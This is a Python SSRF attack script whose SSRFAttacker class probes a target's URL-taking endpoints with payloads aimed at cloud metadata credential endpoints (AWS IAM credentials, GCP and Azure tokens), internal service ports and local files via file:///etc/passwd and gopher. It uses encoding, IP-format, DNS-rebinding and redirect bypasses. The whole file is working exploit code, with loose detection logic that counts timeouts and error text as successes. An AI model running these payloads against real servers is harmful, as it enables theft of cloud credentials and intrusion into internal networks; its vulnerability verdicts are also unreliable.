#!/usr/bin/env python3
"""Server-Side Request Forgery (SSRF) Attacks

These exploits test for SSRF vulnerabilities that allow attackers to induce servers to make HTTP requests to arbitrary domains, including internal resources. In cloud environments, this can lead to metadata endpoint access, credential exfiltration, and lateral movement!

Based on 2025 research showing SSRF as a critical vector for cloud exploitation. The system coordinates internal network reconnaissance, cloud metadata attacks, and protocol smuggling to identify perimeter vulnerabilities.
"""

import asyncio
import logging
import urllib.parse
from typing import Any

import aiohttp

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)


class SSRFAttacker:
    """SSRF exploitation class that systematically tests for Server-Side Request Forgery vulnerabilities to access internal
    resources and cloud metadata endpoints.
    """

    def __init__(self, target_url: str = "http://localhost:8000"):
        self.target_url = target_url.rstrip("/")
        self.session: aiohttp.ClientSession | None = None

        # Common internal network ranges
        self.internal_networks = [
            "127.0.0.1",
            "localhost",
            "0.0.0.0",
            "10.0.0.1",
            "10.0.0.2",
            "192.168.1.1",
            "192.168.0.1",
            "172.16.0.1",
            "169.254.169.254",  # AWS metadata
            "metadata.google.internal",  # GCP metadata
            "169.254.169.254/metadata/instance",  # Azure metadata
        ]

        # Cloud metadata endpoints
        self.cloud_metadata_endpoints = [
            # AWS
            "169.254.169.254/latest/meta-data/",
            "169.254.169.254/latest/meta-data/iam/security-credentials/",
            "169.254.169.254/latest/meta-data/hostname",
            "169.254.169.254/latest/meta-data/local-ipv4",
            "169.254.169.254/latest/meta-data/public-ipv4",
            "169.254.169.254/latest/meta-data/instance-id",
            "169.254.169.254/latest/user-data",
            # GCP
            "metadata.google.internal/computeMetadata/v1/",
            "metadata.google.internal/computeMetadata/v1/instance/",
            "metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
            "metadata.google.internal/computeMetadata/v1/instance/attributes/",
            "metadata.google.internal/computeMetadata/v1/project/",
            # Azure
            "169.254.169.254/metadata/instance?api-version=2021-02-01",
            "169.254.169.254/metadata/identity/oauth2/token",
            "169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/privateIpAddress",
            # Digital Ocean
            "169.254.169.254/metadata/v1/",
            "169.254.169.254/metadata/v1/id",
            "169.254.169.254/metadata/v1/region",
            # OpenStack
            "169.254.169.254/openstack/latest/meta_data.json",
            "169.254.169.254/openstack/latest/user_data",
        ]

        # Common internal services
        self.internal_services = [
            "localhost:22",  # SSH
            "localhost:3306",  # MySQL
            "localhost:5432",  # PostgreSQL
            "localhost:6379",  # Redis
            "localhost:27017",  # MongoDB
            "localhost:9200",  # Elasticsearch
            "localhost:5000",  # Development servers
            "localhost:8080",  # Common web ports
            "localhost:9000",  # Admin panels
            "127.0.0.1:22",
            "127.0.0.1:3306",
            "127.0.0.1:5432",
            "127.0.0.1:6379",
            "127.0.0.1:27017",
            "127.0.0.1:9200",
        ]

    async def __aenter__(self):
        self.session = aiohttp.ClientSession()
        return self

    async def __aexit__(self, exc_type, exc_val, exc_tb):
        if self.session:
            await self.session.close()

    def generate_ssrf_payloads(
        self,
        base_url: str = "http://example.com",
    ) -> list[dict[str, Any]]:
        """ðŸº *crafts hunting traps* Generate SSRF payloads with various encoding
        and bypass techniques to evade filters.
        """
        payloads = []

        # Basic payloads
        for target in self.internal_networks + self.internal_services:
            payloads.append(
                {
                    "name": f"Direct Internal - {target}",
                    "url": f"http://{target}",
                    "description": f"Direct access to internal resource {target}",
                },
            )

        # Cloud metadata payloads
        for endpoint in self.cloud_metadata_endpoints:
            payloads.append(
                {
                    "name": f"Cloud Metadata - {endpoint.split('/')[0]}",
                    "url": f"http://{endpoint}",
                    "description": f"Access cloud metadata endpoint {endpoint}",
                    "headers": (
                        {"Metadata-Flavor": "Google"} if "google" in endpoint else {}
                    ),
                },
            )

        # URL encoding bypasses
        encoded_targets = ["127.0.0.1", "localhost", "169.254.169.254"]

        for target in encoded_targets:
            # URL encoding
            encoded = urllib.parse.quote(target, safe="")
            payloads.append(
                {
                    "name": f"URL Encoded - {target}",
                    "url": f"http://{encoded}",
                    "description": f"URL encoded bypass for {target}",
                },
            )

            # Double URL encoding
            double_encoded = urllib.parse.quote(encoded, safe="")
            payloads.append(
                {
                    "name": f"Double URL Encoded - {target}",
                    "url": f"http://{double_encoded}",
                    "description": f"Double URL encoded bypass for {target}",
                },
            )

        # IP address format bypasses
        localhost_variations = [
            "127.1",
            "127.0.1",
            "0x7f000001",  # Hex
            "2130706433",  # Decimal
            "017700000001",  # Octal
            "0x7f.0x0.0x0.0x1",  # Mixed hex
            "127.000.000.001",  # Padded zeros
            "[::1]",  # IPv6 localhost
            "0:0:0:0:0:0:0:1",  # IPv6 localhost expanded
        ]

        for variation in localhost_variations:
            payloads.append(
                {
                    "name": f"IP Format Bypass - {variation}",
                    "url": f"http://{variation}",
                    "description": f"IP format bypass using {variation}",
                },
            )

        # Protocol smuggling
        protocol_smuggling = [
            "file:///etc/passwd",
            "file:///proc/version",
            "file:///proc/net/arp",
            "gopher://127.0.0.1:22/_",
            "dict://127.0.0.1:11211/",
            "ftp://127.0.0.1/",
            "ldap://127.0.0.1/",
            "sftp://127.0.0.1/",
        ]

        for protocol in protocol_smuggling:
            payloads.append(
                {
                    "name": f"Protocol Smuggling - {protocol.split('://')[0]}",
                    "url": protocol,
                    "description": f"Protocol smuggling via {protocol.split('://')[0]}",
                },
            )

        # DNS rebinding bypasses
        dns_bypasses = [
            "localtest.me",  # Resolves to 127.0.0.1
            "vcap.me",  # Resolves to 127.0.0.1
            "lvh.me",  # Resolves to 127.0.0.1
            "127.0.0.1.nip.io",  # Wildcard DNS to 127.0.0.1
            "0x7f000001.xip.io",  # Hex localhost
        ]

        for dns in dns_bypasses:
            payloads.append(
                {
                    "name": f"DNS Rebinding - {dns}",
                    "url": f"http://{dns}",
                    "description": f"DNS rebinding bypass via {dns}",
                },
            )

        # Redirect bypasses
        redirect_services = [
            "httpbin.org/redirect-to?url=http://127.0.0.1",
            "bit.ly/redirect?url=http://localhost",
            "tinyurl.com/redirect?url=http://169.254.169.254",
        ]

        for redirect in redirect_services:
            payloads.append(
                {
                    "name": f"Redirect Bypass - {redirect.split('/')[0]}",
                    "url": f"http://{redirect}",
                    "description": f"SSRF via redirect service {redirect.split('/')[0]}",
                },
            )

        return payloads

    async def discover_ssrf_endpoints(self) -> list[dict[str, Any]]:
        """ðŸº *scouts hunting grounds* Discover endpoints that might be vulnerable
        to SSRF attacks by analyzing parameters and functionality.
        """
        endpoints = []

        # Common SSRF-vulnerable endpoints
        ssrf_patterns = [
            # URL/webhook parameters
            {"path": "/api/webhook", "param": "url", "method": "POST"},
            {"path": "/api/callback", "param": "callback_url", "method": "POST"},
            {"path": "/api/fetch", "param": "url", "method": "GET"},
            {"path": "/api/proxy", "param": "target", "method": "GET"},
            {"path": "/api/image", "param": "src", "method": "GET"},
            {"path": "/api/preview", "param": "url", "method": "GET"},
            {"path": "/api/scrape", "param": "url", "method": "POST"},
            {"path": "/api/download", "param": "url", "method": "POST"},
            {"path": "/api/upload", "param": "remote_url", "method": "POST"},
            {"path": "/api/import", "param": "source", "method": "POST"},
            # Admin/debug endpoints
            {"path": "/admin/test-connection", "param": "host", "method": "POST"},
            {"path": "/debug/ping", "param": "target", "method": "GET"},
            {"path": "/health/check", "param": "endpoint", "method": "GET"},
            {"path": "/api/validate", "param": "url", "method": "POST"},
            # File/document processing
            {"path": "/api/pdf/generate", "param": "url", "method": "POST"},
            {"path": "/api/document/convert", "param": "source_url", "method": "POST"},
            {"path": "/api/image/process", "param": "image_url", "method": "POST"},
            # Integration endpoints
            {"path": "/api/slack/webhook", "param": "webhook_url", "method": "POST"},
            {"path": "/api/github/webhook", "param": "url", "method": "POST"},
            {"path": "/api/oauth/callback", "param": "redirect_uri", "method": "GET"},
        ]

        if not self.session:
            return endpoints

        for pattern in ssrf_patterns:
            try:
                # Test if endpoint exists
                test_url = f"{self.target_url}{pattern['path']}"

                if pattern["method"] == "GET":
                    async with self.session.get(test_url, timeout=5) as response:
                        if response.status != 404:
                            endpoints.append(pattern)
                            logger.info(
                                f"ðŸº Found potential SSRF endpoint: {pattern['path']}",
                            )
                else:
                    async with self.session.post(test_url, timeout=5) as response:
                        if response.status != 404:
                            endpoints.append(pattern)
                            logger.info(
                                f"ðŸº Found potential SSRF endpoint: {pattern['path']}",
                            )

            except Exception as e:
                logger.debug(f"Error testing endpoint {pattern['path']}: {e!s}")

        return endpoints

    async def test_ssrf_payload(
        self,
        endpoint: dict[str, Any],
        payload: dict[str, Any],
    ) -> dict[str, Any]:
        """ðŸº *strikes with precision* Test a single SSRF payload against an endpoint."""
        if not self.session:
            return {"error": "Session not initialized"}

        url = f"{self.target_url}{endpoint['path']}"
        param = endpoint["param"]
        method = endpoint["method"]

        try:
            # Prepare request data
            headers = {
                "User-Agent": "Mozilla/5.0 SSRFBot/1.0",
                "Accept": "*/*",
            }

            if "headers" in payload:
                headers.update(payload["headers"])

            if method == "GET":
                params = {param: payload["url"]}
                async with self.session.get(
                    url,
                    params=params,
                    headers=headers,
                    timeout=15,
                ) as response:
                    response_text = await response.text()
                    response_time = response.headers.get("response-time", 0)

            else:  # POST
                data = {param: payload["url"]}
                async with self.session.post(
                    url,
                    data=data,
                    headers=headers,
                    timeout=15,
                ) as response:
                    response_text = await response.text()
                    response_time = response.headers.get("response-time", 0)

            # Analyze response for SSRF indicators
            ssrf_indicators = {
                "status_code": response.status,
                "response_length": len(response_text),
                "contains_internal_data": False,
                "contains_cloud_metadata": False,
                "contains_error_info": False,
                "timeout_occurred": False,
                "connection_successful": False,
                "response_time_anomaly": False,
            }

            response_lower = response_text.lower()

            # Check for internal network data
            internal_indicators = [
                "127.0.0.1",
                "localhost",
                "192.168.",
                "10.0.",
                "172.16.",
                "private network",
                "internal",
                "local network",
            ]
            ssrf_indicators["contains_internal_data"] = any(
                indicator in response_lower for indicator in internal_indicators
            )

            # Check for cloud metadata
            cloud_indicators = [
                "ami-",
                "instance-id",
                "security-credentials",
                "metadata",
                "access_token",
                "secret_access_key",
                "session_token",
                "google",
                "aws",
                "azure",
                "digital-ocean",
            ]
            ssrf_indicators["contains_cloud_metadata"] = any(
                indicator in response_lower for indicator in cloud_indicators
            )

            # Check for connection success indicators
            success_indicators = [
                "connection established",
                "data received",
                "response from",
                "successfully connected",
                "content retrieved",
            ]
            ssrf_indicators["connection_successful"] = any(
                indicator in response_lower for indicator in success_indicators
            )

            # Check for error information leakage
            error_indicators = [
                "connection refused",
                "connection timeout",
                "no route to host",
                "name resolution failed",
                "network unreachable",
                "port",
                "socket",
                "dns",
                "resolve",
            ]
            ssrf_indicators["contains_error_info"] = any(
                indicator in response_lower for indicator in error_indicators
            )

            # Determine if SSRF was successful
            vulnerable = (
                response.status == 200
                and (
                    ssrf_indicators["contains_internal_data"]
                    or ssrf_indicators["contains_cloud_metadata"]
                    or ssrf_indicators["connection_successful"]
                )
            ) or (response.status >= 400 and ssrf_indicators["contains_error_info"])

            return {
                "endpoint_path": endpoint["path"],
                "parameter": param,
                "payload_name": payload["name"],
                "payload_url": payload["url"],
                "vulnerable": vulnerable,
                "indicators": ssrf_indicators,
                "response_preview": response_text[:300] if response_text else "",
                "description": payload["description"],
            }

        except TimeoutError:
            return {
                "endpoint_path": endpoint["path"],
                "parameter": param,
                "payload_name": payload["name"],
                "payload_url": payload["url"],
                "vulnerable": True,  # Timeout can indicate successful internal connection
                "timeout": True,
                "description": payload["description"],
            }

        except Exception as e:
            logger.debug(f"Error testing SSRF payload: {e!s}")
            return {
                "endpoint_path": endpoint["path"],
                "parameter": param,
                "payload_name": payload["name"],
                "payload_url": payload["url"],
                "error": str(e),
                "vulnerable": False,
                "description": payload["description"],
            }

    async def comprehensive_ssrf_test(self, endpoint: dict[str, Any]) -> dict[str, Any]:
        """ðŸº *coordinated pack assault* Run comprehensive SSRF testing on an endpoint
        with all payload variations and bypass techniques.
        """
        logger.info(
            f"ðŸº Testing SSRF on {endpoint['path']} parameter '{endpoint['param']}'",
        )

        # Generate SSRF payloads
        payloads = self.generate_ssrf_payloads()

        results = {
            "endpoint": endpoint,
            "total_tests": len(payloads),
            "vulnerable_payloads": [],
            "suspicious_responses": [],
            "timeout_responses": [],
            "summary": {
                "internal_access": 0,
                "cloud_metadata_access": 0,
                "protocol_smuggling": 0,
                "bypass_techniques": 0,
                "total_vulnerabilities": 0,
            },
        }

        # Test each payload
        for payload in payloads:
            test_result = await self.test_ssrf_payload(endpoint, payload)

            if test_result.get("vulnerable", False):
                results["vulnerable_payloads"].append(test_result)
                results["summary"]["total_vulnerabilities"] += 1

                # Categorize vulnerability type
                if "cloud metadata" in payload["name"].lower():
                    results["summary"]["cloud_metadata_access"] += 1
                elif "protocol smuggling" in payload["name"].lower():
                    results["summary"]["protocol_smuggling"] += 1
                elif any(
                    internal in payload["url"]
                    for internal in ["127.0.0.1", "localhost", "192.168"]
                ):
                    results["summary"]["internal_access"] += 1
                else:
                    results["summary"]["bypass_techniques"] += 1

                logger.warning(
                    f"ðŸº SSRF VULNERABILITY: {payload['name']} on {endpoint['path']}",
                )

            elif test_result.get("timeout", False):
                results["timeout_responses"].append(test_result)
                logger.info(
                    f"ðŸº SSRF Timeout (potential internal access): {payload['name']}",
                )

            elif (
                test_result.get("indicators", {}).get("contains_error_info", False)
                or test_result.get("indicators", {}).get("status_code", 0) >= 400
            ):
                results["suspicious_responses"].append(test_result)

            # Small delay to avoid overwhelming the server
            await asyncio.sleep(0.1)

        logger.info(
            f"ðŸº SSRF test complete for {endpoint['path']}: "
            f"{results['summary']['total_vulnerabilities']} vulnerabilities found",
        )

        return results

    async def run_full_ssrf_assessment(self) -> dict[str, Any]:
        """ðŸº *territory domination* Run full SSRF assessment across all discovered
        vulnerable endpoints.
        """
        logger.info("ðŸº Starting comprehensive SSRF assessment...")

        # Discover SSRF-vulnerable endpoints
        endpoints = await self.discover_ssrf_endpoints()
        logger.info(f"ðŸº Testing {len(endpoints)} endpoints for SSRF vulnerabilities")

        assessment_results = {
            "target_url": self.target_url,
            "endpoints_tested": len(endpoints),
            "endpoint_results": [],
            "overall_summary": {
                "total_vulnerabilities": 0,
                "vulnerable_endpoints": 0,
                "internal_access_points": 0,
                "cloud_metadata_access": 0,
                "protocol_smuggling_success": 0,
                "critical_findings": 0,
            },
        }

        # Test each endpoint
        for endpoint in endpoints:
            endpoint_result = await self.comprehensive_ssrf_test(endpoint)
            assessment_results["endpoint_results"].append(endpoint_result)

            # Update overall summary
            assessment_results["overall_summary"][
                "total_vulnerabilities"
            ] += endpoint_result["summary"]["total_vulnerabilities"]

            if endpoint_result["summary"]["total_vulnerabilities"] > 0:
                assessment_results["overall_summary"]["vulnerable_endpoints"] += 1

            assessment_results["overall_summary"][
                "internal_access_points"
            ] += endpoint_result["summary"]["internal_access"]
            assessment_results["overall_summary"][
                "cloud_metadata_access"
            ] += endpoint_result["summary"]["cloud_metadata_access"]
            assessment_results["overall_summary"][
                "protocol_smuggling_success"
            ] += endpoint_result["summary"]["protocol_smuggling"]

            # Critical findings (cloud metadata or internal network access)
            if (
                endpoint_result["summary"]["cloud_metadata_access"] > 0
                or endpoint_result["summary"]["internal_access"] > 0
            ):
                assessment_results["overall_summary"]["critical_findings"] += 1

        logger.info(
            f"ðŸº SSRF assessment complete: "
            f"{assessment_results['overall_summary']['total_vulnerabilities']} vulnerabilities found "
            f"across {assessment_results['overall_summary']['vulnerable_endpoints']} endpoints",
        )

        return assessment_results


async def main():
    """ðŸº *howls with pack coordination* Main hunting function for SSRF exploitation."""
    target_url = "http://localhost:8000"

    async with SSRFAttacker(target_url) as attacker:
        print("ðŸº Starting SSRF (Server-Side Request Forgery) Assessment...")

        # Run full SSRF assessment
        results = await attacker.run_full_ssrf_assessment()

        print("\nðŸº SSRF ASSESSMENT RESULTS:")
        print(f"Endpoints tested: {results['endpoints_tested']}")
        print(
            f"Total vulnerabilities: {results['overall_summary']['total_vulnerabilities']}",
        )
        print(
            f"Vulnerable endpoints: {results['overall_summary']['vulnerable_endpoints']}",
        )
        print(
            f"Internal access points: {results['overall_summary']['internal_access_points']}",
        )
        print(
            f"Cloud metadata access: {results['overall_summary']['cloud_metadata_access']}",
        )
        print(
            f"Protocol smuggling: {results['overall_summary']['protocol_smuggling_success']}",
        )
        print(f"Critical findings: {results['overall_summary']['critical_findings']}")

        # Show detailed results for vulnerable endpoints
        print("\nðŸº VULNERABLE ENDPOINT DETAILS:")
        for endpoint_result in results["endpoint_results"]:
            if endpoint_result["summary"]["total_vulnerabilities"] > 0:
                endpoint = endpoint_result["endpoint"]
                print(
                    f"\nVulnerable: {endpoint['method']} {endpoint['path']} (param: {endpoint['param']})",
                )
                print(
                    f"  Total vulnerabilities: {endpoint_result['summary']['total_vulnerabilities']}",
                )
                print(
                    f"  Internal access: {endpoint_result['summary']['internal_access']}",
                )
                print(
                    f"  Cloud metadata: {endpoint_result['summary']['cloud_metadata_access']}",
                )
                print(
                    f"  Protocol smuggling: {endpoint_result['summary']['protocol_smuggling']}",
                )

                # Show critical vulnerabilities
                for vuln in endpoint_result["vulnerable_payloads"][:3]:
                    print(f"    âœ“ {vuln['payload_name']}: {vuln['payload_url']}")
                    if vuln.get("response_preview"):
                        print(f"      Response: {vuln['response_preview'][:100]}...")


if __name__ == "__main__":
    asyncio.run(main())
